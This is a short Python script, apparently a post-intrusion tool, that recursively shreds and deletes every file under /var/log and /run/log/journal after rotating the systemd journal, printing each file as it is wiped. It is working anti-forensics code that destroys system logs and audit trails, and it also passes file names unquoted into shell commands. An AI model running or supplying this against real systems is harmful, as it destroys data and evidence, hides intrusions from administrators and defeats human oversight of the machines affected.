#!/usr/bin/python3
import os 
from time import sleep 

normal_logs = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("/var/log")) for f in fn]
for i in normal_logs:
    print(f"[+] Clearing {i}")
    os.system(f"shred -uz {i}")

os.system("/usr/bin/journalctl --rotate")

journal_logs = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("/run/log/journal")) for f in fn]
for i in journal_logs:
    print(f"[+] Clearning {i}")
    os.system(f"shred -uz {i}")

print("[+] Done clearning logs")
